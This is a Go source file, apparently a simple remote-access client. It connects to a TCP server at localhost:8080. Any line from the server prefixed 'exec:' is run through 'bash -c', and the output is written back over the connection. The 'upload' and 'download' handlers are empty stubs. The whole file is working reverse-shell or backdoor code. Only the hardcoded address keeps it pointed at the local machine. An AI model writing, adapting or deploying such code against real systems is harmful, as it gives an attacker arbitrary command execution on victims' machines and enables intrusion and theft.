package main

import (
	"fmt"
	"net"
	"log"
	"os/exec"
	"strings"
	"bufio"
)


func main() {
	conn, err := net.Dial("tcp", "localhost:8080")
	if err != nil {
		log.Fatal(err)
	}
	defer conn.Close()

	fmt.Println("Connection established to localhost:8080")

	// Received data from server
	buf := make([]byte, 1024)
	n, err := conn.Read(buf)
	if err != nil {
		fmt.Println(err)
		return
	}
	fmt.Printf("From Server (%s) : %s\n", conn.RemoteAddr(), string(buf[:n]))

	// Goroutine to read server responses
	go func(c net.Conn) {
		reader := bufio.NewReader(c)
		for {
			cmdLine, err := reader.ReadString('\n')
			if err != nil {
				fmt.Println("[!] Server closed connection:", err)
				break
			}
			cmdLine = strings.TrimSpace(cmdLine)
			fmt.Printf("[>] Received command: %s\n", cmdLine)
			parseCommand(cmdLine, conn)
		}
	}(conn)

	// Block main thread to keep the connection open
	select {}
}


func parseCommand(cmdLine string, conn net.Conn) {
	if strings.HasPrefix(cmdLine, "exec:") {
		cmdStr := strings.TrimPrefix(cmdLine, "exec:")

		cmd := exec.Command("bash", "-c", cmdStr)
		fmt.Printf("[>] Executing command: %s\n", cmd)
		output, err := cmd.CombinedOutput()
		fmt.Printf("[>] Executing command: %s\n", output)
		if err != nil {
			output = []byte(err.Error())
		}
		conn.Write([]byte(string(output) + "\n"))
	}else if strings.HasPrefix(cmdLine, "upload:") {
		return
	}else if strings.HasPrefix(cmdLine, "download:") {
		return
	}else{
		return
	}
}